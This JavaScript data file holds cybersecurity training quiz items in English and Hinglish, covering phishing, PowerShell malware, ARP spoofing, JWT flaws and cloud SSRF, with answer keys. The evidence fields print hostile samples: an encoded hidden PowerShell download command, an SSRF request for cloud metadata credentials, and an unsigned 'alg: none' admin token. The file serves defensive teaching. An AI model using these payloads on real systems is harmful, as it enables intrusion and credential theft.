/**
 * Kairos Cybersecurity Curriculum Database
 * 5 Domains, 3 Tiers (Awareness, Mechanics, Mastery), 
 * Real-world artifacts, EL10 explanations, and native Hinglish translations.
 */

export const CYBER_DOMAINS = [
  {
    id: 'phishing-social-eng',
    title: 'Phishing & Social Engineering',
    titleHinglish: 'Phishing aur Social Engineering Defense',
    icon: '🎣',
    description: 'Master deceptive URL parsing, punycode attacks, email header authentication (SPF/DKIM/DMARC), and MFA push fatigue manipulation.',
    descriptionHinglish: 'Fake URLs, spoofed emails, aur MFA fatigue attacks ko pehchan kar rokna seekho.',
    activeLearners: 142,
    microTopics: ['Subdomain Spoofing', 'Punycode Typosquatting', 'Email Header Analysis', 'MFA Fatigue Defense', 'Reverse Proxy Phishing'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Threat Identification & Red Flags' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Attack Vectors & Protocol Inspection' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Forensic Remediation & DMARC Enforce' }
    ],
    diagnostics: [
      {
        id: 'q_phish_1',
        title: 'The Deceptive Banking Portal',
        titleHinglish: 'Dhokhebaaz Netbanking URL',
        microTopic: 'Subdomain Hierarchy & Lookalike Spoofing',
        scenario: 'An employee received an urgent SMS: "Your HDFC account KYC is expired. Update immediately." They clicked the link and are prompted for login.',
        scenarioHinglish: 'Ek employee ko urgent SMS mila: "HDFC account KYC expire ho gaya hai." Usne link click kiya aur login page khul gaya.',
        evidenceType: 'url',
        evidence: 'https://netbanking.hdfcbank.com.co/auth/verify?session=9281',
        options: [
          {
            text: 'Safe: The URL begins with "netbanking.hdfcbank.com" and has an HTTPS padlock.',
            textHinglish: 'Safe hai: URL mein "netbanking.hdfcbank.com" likha hai aur HTTPS padlock bhi hai.'
          },
          {
            text: 'Phishing: The apex root domain is "com.co", not "hdfcbank.com". "netbanking.hdfcbank" is an attacker subdomain.',
            textHinglish: 'Phishing hai: Asli root domain "com.co" hai, "hdfcbank" nahi. Attacker ne subdomain bana rakha hai.'
          },
          {
            text: 'Safe: "com.co" is the official Colombian subsidiary domain for Indian banking systems.',
            textHinglish: 'Safe hai: "com.co" Indian banks ka official international domain extension hota hai.'
          },
          {
            text: 'Phishing: Any URL with a query parameter "?session=" is an active ransomware payload.',
            textHinglish: 'Phishing hai: Har URL jisme "?session=" hota hai wo ransomware hota hai.'
          }
        ],
        correctIndex: 1,
        el10: 'Think of a domain like a street address. The LAST part before the first single slash (/) is the actual house owner. Here, the house owner is "com.co", and the attacker named their bedroom "netbanking.hdfcbank".',
        el10Hinglish: 'Domain ko ghar ke address ki tarah samjho. Pehle single slash (/) se theek pehle jo naam hota hai, wahi asli makaan-malik hai! Yahan makaan-malik "com.co" hai, aur attacker ne apne kamre ka naam "netbanking.hdfcbank" rakh diya hai.',
        soWhat: 'Entering credentials here gives attackers full session access, leading to instant financial fraud or employee credential harvesting.',
        remediationQuery: 'how to read DNS domain names and subdomains cybersecurity',
        videoId: 'Vf6L2x5zHbg', // NetworkChuck DNS tutorial
        videoTitle: 'DNS Explained: How Domain Spoofing Actually Works',
        cheatSheet: [
          'The apex domain is always immediately to the left of the public suffix (.com, .org, .co).',
          'HTTPS padlocks only mean encryption is on—not that the website owner is legitimate!',
          'Always read domain names from right to left starting from the first slash.'
        ]
      },
      {
        id: 'q_phish_2',
        title: 'The Forged Executive Wire Transfer',
        titleHinglish: 'Fake CEO Wire Transfer Email',
        microTopic: 'Email Authentication (SPF, DKIM, DMARC)',
        scenario: 'Finance received an urgent email from "ceo@megacorp.com" demanding an emergency wire of $85,000. Here are the raw headers:',
        scenarioHinglish: 'Finance team ko CEO se emergency wire transfer ki request aayi. Raw email headers ye hain:',
        evidenceType: 'headers',
        evidence: `From: "Alex CEO" <ceo@megacorp.com>
Reply-To: alex-exec@mail-officesecure.net
Received: from mail.attacker-vps.xyz (198.51.100.44)
Authentication-Results: spf=softfail (sender IP not in megacorp SPF record);
  dkim=none;
  dmarc=fail (p=none)`,
        options: [
          {
            text: 'Legitimate: The From header says "ceo@megacorp.com" which cannot be faked.',
            textHinglish: 'Asli hai: From header mein "ceo@megacorp.com" likha hai jo fake nahi ho sakta.'
          },
          {
            text: 'Legitimate: The sender server successfully connected via port 25 with no bounce.',
            textHinglish: 'Asli hai: Sender server connect ho gaya bina kisi bounce ke.'
          },
          {
            text: 'Spoofed: SPF softfailed, DKIM is absent, and Reply-To redirects responses to a third-party domain.',
            textHinglish: 'Spoofed hai: SPF fail hua, DKIM gayab hai, aur Reply-To attacker ke alag domain par ja raha hai.'
          },
          {
            text: 'Safe: DMARC p=none means the domain has maximum security enforcement enabled.',
            textHinglish: 'Safe hai: DMARC p=none ka matlab hai high security enabled hai.'
          }
        ],
        correctIndex: 2,
        el10: 'The "From" field is like writing the CEO’s name on the outside of an envelope with a pen. Anyone can write it! SPF and DKIM are the postal wax seals that prove who actually sent it.',
        el10Hinglish: 'From field bilkul lifafe (envelope) par pen se kisi ka bhi naam likhne jaisa hai. Asli proof SPF aur DKIM ki seal hoti hai jo yahan toot chuki hai.',
        soWhat: 'Without DMARC enforcement (p=reject), external attackers can impersonate C-level executives and trigger catastrophic business email compromise (BEC).',
        remediationQuery: 'spf dkim dmarc explained simply',
        videoId: 'sO4x9_GkXjA',
        videoTitle: 'SPF, DKIM, DMARC in 10 Minutes',
        cheatSheet: [
          'DMARC p=none provides zero protection—it is monitoring only.',
          'Always verify the Reply-To header when analyzing urgent financial requests.',
          'DKIM cryptographic signatures ensure the email was not modified in transit.'
        ]
      },
      {
        id: 'q_phish_3',
        title: 'MFA Push Notification Flood',
        titleHinglish: 'Raat ko 3 Baje MFA Notification Flood',
        microTopic: 'MFA Fatigue (Push Bombing) Attacks',
        scenario: 'At 3:15 AM, a systems engineer receives 42 consecutive push notifications on Microsoft Authenticator: "Approve sign-in to Azure Portal?".',
        scenarioHinglish: 'Raat ko 3:15 baje ek engineer ko 42 notifications aane lage: "Approve sign-in?".',
        evidenceType: 'logs',
        evidence: `03:14:55 AuthReq [User: admin_dev] [IP: 185.220.101.5] [Location: St. Petersburg, RU]
03:14:58 AuthReq [User: admin_dev] [Repeated x12]
03:15:10 PushResponse: PENDING (User device vibrating continuously)
03:15:22 WhatsApp Msg: "IT Helpdesk: Please hit Approve on your authenticator to stop the test."`,
        options: [
          {
            text: 'Press "Approve" so the notifications stop vibrating, then change your password in the morning.',
            textHinglish: '"Approve" daba do taaki phone bajna band ho, subah password badal lena.'
          },
          {
            text: 'Press "Deny", report fraud immediately to SOC, and enable Number Matching or FIDO2 Passkeys.',
            textHinglish: '"Deny" dabao, SOC ko fraud report karo, aur Number Matching ya FIDO2 passkeys enable karo.'
          },
          {
            text: 'Airplane mode the phone; the session will securely self-terminate on the server within 24 hours.',
            textHinglish: 'Phone ko airplane mode par daal do, 24 ghante mein session khatam ho jayega.'
          },
          {
            text: 'Reply to the WhatsApp message with your current password to verify your identity to IT.',
            textHinglish: 'WhatsApp message par apna password bhej do taaki IT verify kar sake.'
          }
        ],
        correctIndex: 1,
        el10: 'An attacker already guessed your password and is ringing your doorbell 100 times hoping you get tired and open the door. Never open the door!',
        el10Hinglish: 'Chor ke paas tumhare ghar ki chabi (password) aa chuki hai aur wo raat bhar doorbell baja raha hai taaki tum tang aakar darwaza khol do. Darwaza bilkul mat kholo!',
        soWhat: 'MFA Fatigue was the exact attack vector behind the Uber, Cisco, and Lapsus$ corporate breaches.',
        remediationQuery: 'mfa fatigue attack prevention number matching',
        videoId: '7a0v24w_ZqI',
        videoTitle: 'MFA Fatigue: How Hackers Bypass Multi-Factor Authentication',
        cheatSheet: [
          'Simple push notifications (Approve/Deny) are vulnerable to fatigue attacks.',
          'Number matching forces the user to type the 2-digit code displayed on the login screen.',
          'FIDO2 / WebAuthn hardware tokens are immune to push fatigue and phishing.'
        ]
      },
      {
        id: 'q_phish_4',
        title: 'The Invisible Cyrillic Impersonation',
        titleHinglish: 'Invisible Cyrillic Character Attack (Punycode)',
        microTopic: 'Internationalized Domain Names (IDN) & Punycode',
        scenario: 'A browser bar displays what looks identical to "apple.com", but looking at the network certificate reveals something unexpected:',
        scenarioHinglish: 'Browser mein "apple.com" dikh raha hai, lekin certificate details mein ye show ho raha hai:',
        evidenceType: 'url',
        evidence: `Browser Address Bar: https://аpple.com/login
Raw DNS Query: xn--pple-43d.com
TLS Subject CN: xn--pple-43d.com (Issuer: Let's Encrypt)`,
        options: [
          {
            text: 'Safe: The browser rendered Latin characters, which means the OS verified the typography.',
            textHinglish: 'Safe hai: Browser ne standard letters render kiye hain.'
          },
          {
            text: 'Homograph Attack: The letter "а" is Cyrillic (U+0430), resolved by DNS as punycode "xn--pple-43d.com".',
            textHinglish: 'Homograph Attack hai: Letter "а" Russian Cyrillic character hai, jiska asli DNS naam "xn--pple-43d.com" hai.'
          },
          {
            text: 'Safe: "xn--" is an internal DNS compression tag used by Apple Cloudflare edge servers.',
            textHinglish: 'Safe hai: "xn--" Apple ke edge CDN ka speed booster tag hota hai.'
          },
          {
            text: 'Phishing: Only domains using .net or .org are capable of hosting TLS certificates.',
            textHinglish: 'Phishing hai: Sirf .net domains par TLS certificate lag sakte hain.'
          }
        ],
        correctIndex: 1,
        el10: 'In the alphabet of another language, there is a letter that looks 100% like English "a", but the computer treats it like a completely different word.',
        el10Hinglish: 'Russian bhasha mein ek letter hota hai jo bilkul English ke "a" jaisa dikhta hai, lekin computer ke liye wo bilkul alag character hai. Aankhein dhoka kha sakti hain!',
        soWhat: 'Users will never spot the difference with human vision alone. Browsers and endpoint filters must inspect punycode strings.',
        remediationQuery: 'punycode idn homograph attack explanation',
        videoId: 'C03K8N3rQjM',
        videoTitle: 'The Scariest Phishing Attack Ever (Punycode)',
        cheatSheet: [
          'Any domain starting with "xn--" is a punycode representation of non-ASCII characters.',
          'Password managers will not autofill credentials into punycode lookalike domains.',
          'Always use password managers as a defensive shield against homograph tricks.'
        ]
      },
      {
        id: 'q_phish_5',
        title: 'Reverse-Proxy Man-in-the-Middle (Evilginx)',
        titleHinglish: 'Evilginx Reverse Proxy Attack',
        microTopic: 'Session Cookie Hijacking via Reverse Proxy',
        scenario: 'A user successfully logs in, types an SMS OTP code, and enters the dashboard. 2 minutes later, an attacker logs into their account without needing the password or the OTP.',
        scenarioHinglish: 'User ne login kiya, SMS OTP daala. 2 minute baad attacker bina password aur bina OTP ke user ke account mein ghus gaya.',
        evidenceType: 'logs',
        evidence: `Attacker Proxy Server (Evilginx2):
[Captured Credentials] User: dev@victim.org | Pass: CorrectHorseBattery#99
[Captured MFA Token] OTP: 829104 (Consumed by real Google Server)
[Captured Session Cookie] Name: OSID | Value: AIzaSyD... | Expiry: +30 days
Status: Attacker injected session cookie into local browser. Session Authenticated.`,
        options: [
          {
            text: 'The attacker cracked the user’s master password hash using rainbow tables.',
            textHinglish: 'Attacker ne password hash ko rainbow table se crack kar liya.'
          },
          {
            text: 'The attacker hosted a transparent proxy that forwarded requests to the real server and captured the authenticated session cookie.',
            textHinglish: 'Attacker ne beech mein proxy baithaya, asli server ko data forward kiya, aur login hote hi authenticated session cookie chura li.'
          },
          {
            text: 'The user’s mobile cell tower was cloned via a Stingray IMSI catcher.',
            textHinglish: 'User ka SIM card clone ho gaya tha.'
          },
          {
            text: 'The SMS OTP code was reused 10 times due to weak random number generation.',
            textHinglish: 'SMS OTP bar-bar use ho gaya kyunki system weak tha.'
          }
        ],
        correctIndex: 1,
        el10: 'Imagine ordering food through a fake waiter who orders from the real chef for you, but steals your receipt so he can claim all your food later.',
        el10Hinglish: 'Socho tum hotel mein baithe ho aur ek fake waiter tumhara order asli chef tak le gaya, lekin bill aur receipt apne paas rakh li taaki wo tumhara khana chura sake.',
        soWhat: 'Traditional SMS and app-based OTPs do not stop reverse proxy phishing. Only FIDO2 / WebAuthn cryptographic origin binding defeats this.',
        remediationQuery: 'evilginx reverse proxy phishing fido2 passkeys',
        videoId: 'pP8p6uJmGZg',
        videoTitle: 'How Hackers Steal Session Cookies with Reverse Proxies',
        cheatSheet: [
          'SMS and TOTP codes are vulnerable to real-time proxy interception.',
          'FIDO2/WebAuthn binds authentication cryptographically to the exact browser URL.',
          'Protect session cookies with HttpOnly, Secure, and SameSite=Strict attributes.'
        ]
      }
    ]
  },
  {
    id: 'malware-defense',
    title: 'Malware & Ransomware Defense',
    titleHinglish: 'Malware aur Ransomware Kill-Chain',
    icon: '🦠',
    description: 'Deconstruct malicious macros, dropper stages, LOLBins (Living off the Land Binaries), and behavioral ransomware detection.',
    descriptionHinglish: 'Malicious scripts, PowerShell attacks, aur ransomware kill-chain ko forensic analysis se samjho.',
    activeLearners: 98,
    microTopics: ['Droppers & Stagers', 'Living off the Land (LOLBins)', 'PowerShell Obfuscation', 'Shadow Copy Deletion', 'Persistence Registry Run Keys'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Malicious File Formats & Social Engineering Hooks' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Script Obfuscation, LOLBins & Sandbox Evasion' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Memory Triage, YARA Rules & Kill-Chain Dismantling' }
    ],
    diagnostics: [
      {
        id: 'q_mal_1',
        title: 'The Obfuscated PowerShell Command',
        titleHinglish: 'Chupa Hua PowerShell Command',
        microTopic: 'PowerShell Execution & Obfuscation',
        scenario: 'A SIEM alert triggers on an accounting workstation running this suspicious process command:',
        scenarioHinglish: 'Accounting computer par ek ajeeb command run hone ka alert aaya:',
        evidenceType: 'code',
        evidence: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB4AGkAbAAuAHgAeQB6AC8AcAAuAHgAZQA=`,
        options: [
          {
            text: 'Normal Windows Update scheduled maintenance script.',
            textHinglish: 'Normal Windows Update ka daily background script hai.'
          },
          {
            text: 'Malicious: Base64-encoded command running hidden without profile to bypass execution policy and download a payload.',
            textHinglish: 'Malicious hai: Base64 mein chupa command jo chupke se internet se virus file download kar raha hai.'
          },
          {
            text: 'Benign: Microsoft Teams audio device driver calibration.',
            textHinglish: 'Microsoft Teams ka mic set karne wala code hai.'
          },
          {
            text: 'Database indexing task triggered by Microsoft Excel 365.',
            textHinglish: 'Excel sheet ka database refresh command hai.'
          }
        ],
        correctIndex: 1,
        el10: 'The attacker is telling the computer: "Do this secretly (-W Hidden), don’t ask for permission (-Exec Bypass), and I scrambled the words into code (-enc) so the teacher can’t read it."',
        el10Hinglish: 'Attacker computer ko chupke se keh raha hai: "Bina kisi ko bataye parde ke peeche kaam karo, koi permission mat maango, aur maine language encode kar di hai taaki koi samajh na sake."',
        soWhat: 'Executing arbitrary encoded scripts allows initial access brokers to drop cobalt strike beacons or ransomware encryptors across the domain.',
        remediationQuery: 'powershell base64 encoded command malware analysis',
        videoId: 'lzaW5y_pW8M',
        videoTitle: 'Analyzing Obfuscated PowerShell Attacks',
        cheatSheet: [
          '-NoP means NoProfile (skips default user scripts to load faster).',
          '-W Hidden hides the command window from the logged-in victim.',
          'Constrained Language Mode (CLM) and Script Block Logging neutralize encoded attacks.'
        ]
      }
    ]
  },
  {
    id: 'network-exploitation',
    title: 'Network Exploitation & Sniffing',
    titleHinglish: 'Network Sniffing aur Traffic Forensics',
    icon: '🌐',
    description: 'Analyze ARP cache poisoning, rogue DHCP servers, Wireshark packet captures, and TLS stripping attacks.',
    descriptionHinglish: 'Wireshark packet analysis, Man-in-the-middle attacks, aur network packet sniffing ki deep knowledge.',
    activeLearners: 115,
    microTopics: ['ARP Poisoning', 'DNS Cache Poisoning', 'TLS Certificate Validation', 'Wireshark PCAP Triage', 'Port Knocking & Nmap Forensics'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Unencrypted Protocols (HTTP, FTP, Telnet)' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Layer 2 MITM & Packet Tampering' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Network Triage, PCAP Carving & Port Hardening' }
    ],
    diagnostics: [
      {
        id: 'q_net_1',
        title: 'The Default Gateway MAC Address Flip',
        titleHinglish: 'MAC Address Duplicate Ho Gaya (ARP Spoofing)',
        microTopic: 'ARP Cache Poisoning (Layer 2 MITM)',
        scenario: 'An admin inspects the local machine ARP table after users complain of slow internet and security warnings:',
        scenarioHinglish: 'Users ne complain kiya ki internet ajeeb behave kar raha hai. Admin ne ARP table check ki:',
        evidenceType: 'logs',
        evidence: `Internet Address      Physical Address      Type
192.168.1.1           00-14-22-01-23-45     dynamic (Default Gateway)
192.168.1.55          00-14-22-01-23-45     dynamic (Workstation-Sales-PC)
192.168.1.100         e4-a7-a0-99-bb-12     dynamic`,
        options: [
          {
            text: 'Normal: High-availability router clustering mirrors MAC addresses for redundancy.',
            textHinglish: 'Normal hai: Router speed badhane ke liye MAC address duplicate karta hai.'
          },
          {
            text: 'ARP Poisoning Attack: Workstation 192.168.1.55 has spoofed the router gateway MAC to intercept all outbound traffic.',
            textHinglish: 'ARP Poisoning Attack hai: Workstation .55 ne router ka roop le liya hai taaki sara internet traffic uske through nikle.'
          },
          {
            text: 'DHCP IP exhaustion error caused by too many Wi-Fi guest devices.',
            textHinglish: 'Wi-Fi par zyada guests aane se network confuse ho gaya.'
          },
          {
            text: 'DNS amplification attack directed at port 53.',
            textHinglish: 'DNS server par DDoS attack ho raha hai.'
          }
        ],
        correctIndex: 1,
        el10: 'Imagine if someone stood in your classroom shouting: "I am the teacher!" whenever anyone asks a question. That is ARP spoofing.',
        el10Hinglish: 'Classroom mein ek naughty student khada hokar bolne laga: "Main hi teacher hoon, saare homework mujhe do!" Ye ARP spoofing hai.',
        soWhat: 'An attacker positioned as default gateway can decrypt, modify, or inject payloads into unencrypted local network traffic.',
        remediationQuery: 'arp spoofing detection dynamic arp inspection switch',
        videoId: 'uIwXn3y3aV8',
        videoTitle: 'ARP Spoofing Explained in 5 Minutes',
        cheatSheet: [
          'Two different IP addresses mapped to the exact same MAC address is the hallmark of ARP poisoning.',
          'Dynamic ARP Inspection (DAI) on managed switches stops spoofed gratuitous ARP replies.',
          'Static ARP tables or 802.1X port security provide enterprise network defense.'
        ]
      }
    ]
  },
  {
    id: 'identity-token',
    title: 'Identity, Auth & Token Hijacking',
    titleHinglish: 'JWT Tokens aur Session Hijacking',
    icon: '🔑',
    description: 'Inspect JWT tokens, signature tampering (alg: none), session fixation, OAuth token theft, and Passkey security.',
    descriptionHinglish: 'JWT security, token replay attacks, cookies, aur modern Passkeys ka complete guide.',
    activeLearners: 84,
    microTopics: ['JWT alg:none Exploit', 'Session Replay', 'OAuth Redirect URI Manipulation', 'Refresh Token Rotation', 'Passkey WebAuthn'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Basic Auth vs Bearer Tokens vs Cookies' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'Token Structure & Cryptographic Signatures' },
      { id: 3, name: 'Level 3: Mastery', focus: 'OAuth Hardening & Zero-Trust Token Validation' }
    ],
    diagnostics: [
      {
        id: 'q_id_1',
        title: 'The Unsigned "alg": "none" Token',
        titleHinglish: 'Bina Signature Wala JWT Token (alg: none)',
        microTopic: 'JWT Signature Verification Bypass',
        scenario: 'A security engineer intercepts an authentication token sent in the Authorization header:',
        scenarioHinglish: 'Security test ke dauran ek user ka JWT token dekha gaya:',
        evidenceType: 'code',
        evidence: `Header:  {"alg": "none", "typ": "JWT"}
Payload: {"sub": "1002", "name": "Intern", "role": "SuperAdmin", "exp": 1999999999}
Signature: (empty string after trailing period)`,
        options: [
          {
            text: 'Safe: "alg": "none" is the modern IETF high-speed encryption standard for cloud microservices.',
            textHinglish: 'Safe hai: "none" ka matlab cloud speed ke liye automatic secure validation.'
          },
          {
            text: 'Vulnerable: The token explicitly disables signature verification; vulnerable backends will trust modified roles like SuperAdmin.',
            textHinglish: 'Vulnerable hai: Signature ko "none" karke bypass kiya gaya hai. Kamzor backend ise bina check kiye SuperAdmin maan lega!'
          },
          {
            text: 'Malformed: The token is corrupted and will immediately crash the HTTP server parser.',
            textHinglish: 'Token kharab ho chuka hai aur server par 500 error aayega.'
          },
          {
            text: 'Safe: The expiration timestamp is in the future, proving cryptographic validity.',
            textHinglish: 'Safe hai: Expiry date future ki hai isliye valid hai.'
          }
        ],
        correctIndex: 1,
        el10: 'A JWT token is like a hall pass stamped by the principal. If the student writes "Stamp: None" and changes their grade to A+, a bad teacher will just believe it without checking the stamp!',
        el10Hinglish: 'JWT token principal ke stamp wale school pass jaisa hai. Agar student stamp ki jagah likh de "Stamp: None" aur khud ko School Headboy bana le, aur teacher maan le—to ye "alg: none" flaw hai!',
        soWhat: 'Attackers can elevate themselves to full administrator privileges across APIs without knowing any secret keys.',
        remediationQuery: 'jwt alg none vulnerability fix jwt verification',
        videoId: '7Q17ubqLfaM',
        videoTitle: 'JWT Security Vulnerabilities: Alg None & Key Confusion',
        cheatSheet: [
          'Never accept tokens with "alg": "none" in production.',
          'Always whitelist expected algorithms (e.g. RS256, Ed25519) on the server.',
          'Keep JWT secrets long, random, and stored in secure secret vaults.'
        ]
      }
    ]
  },
  {
    id: 'cloud-security',
    title: 'Cloud Infrastructure Security',
    titleHinglish: 'Cloud Security aur IAM Misconfiguration',
    icon: '☁️',
    description: 'Investigate public Cloud Storage bucket leaks, IAM privilege escalation, SSRF attacks on metadata services, and Kubernetes RBAC.',
    descriptionHinglish: 'AWS/GCP bucket leaks, IAM permissions, metadata service attacks, aur Cloud forensic security.',
    activeLearners: 129,
    microTopics: ['Public S3/GCS Buckets', 'IMDSv1 vs IMDSv2 SSRF', 'IAM Wildcard Permissions', 'CloudTrail Log Tampering', 'Container Escape'],
    tiers: [
      { id: 1, name: 'Level 1: Awareness', focus: 'Public Cloud Asset Discovery' },
      { id: 2, name: 'Level 2: Mechanics', focus: 'SSRF & Cloud Metadata Token Harvesting' },
      { id: 3, name: 'Level 3: Mastery', focus: 'Least Privilege IAM Policies & Guardrails' }
    ],
    diagnostics: [
      {
        id: 'q_cloud_1',
        title: 'The 169.254.169.254 Metadata Pivot',
        titleHinglish: 'Cloud Metadata IP (169.254.169.254) Attack',
        microTopic: 'Server-Side Request Forgery (SSRF) on Cloud IMDS',
        scenario: 'A web application has a profile picture import feature from a user-supplied URL. An attacker enters this URL in the box:',
        scenarioHinglish: 'Profile picture upload URL box mein attacker ne ye address daala:',
        evidenceType: 'code',
        evidence: `POST /api/profile/import-avatar
Host: app.megacorp.cloud
Content-Type: application/json

{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role"}`,
        options: [
          {
            text: 'Benign: It attempts to load an avatar from an internal loopback webcam.',
            textHinglish: 'Normal hai: Local webcam se photo lene ki koshish hai.'
          },
          {
            text: 'SSRF Attack: The server will fetch its own cloud metadata service and return temporary AWS/GCP IAM credentials to the attacker.',
            textHinglish: 'SSRF Attack hai: Server apne hi cloud metadata IP ko call karega aur attacker ko cloud ke admin credentials de dega!'
          },
          {
            text: 'DDoS: 169.254.169.254 is a broadcast ping address that overwhelms local switches.',
            textHinglish: 'Network switch par load badhane wala DDoS trick hai.'
          },
          {
            text: 'Safe: Cloud security groups automatically block all HTTP traffic on port 80.',
            textHinglish: 'Safe hai: Cloud firewall automatically internal IP block kar deta hai.'
          }
        ],
        correctIndex: 1,
        el10: 'You asked the company robot butler to go fetch a picture, but you tricked the butler into walking into the manager\'s secret office and photocopying the master keys!',
        el10Hinglish: 'Tumne company ke robot se kaha "mere liye photo laao", lekin robot ko manager ke secret locker ka address de diya jahan se wo master chabi chura laya!',
        soWhat: 'This SSRF technique was the exact method used in the Capital One breach affecting over 100 million customer records.',
        remediationQuery: 'ssrf aws metadata imdsv2 prevention',
        videoId: '8W8X2qK4x9Y',
        videoTitle: 'How Hackers Steal Cloud Keys with SSRF',
        cheatSheet: [
          '169.254.169.254 is the link-local Cloud Instance Metadata Service (IMDS).',
          'Enforce IMDSv2 (requires session token header PUT) to neutralize simple SSRF.',
          'Disable HTTP URL fetchers or validate against private IP address ranges (RFC 1918).'
        ]
      }
    ]
  }
];
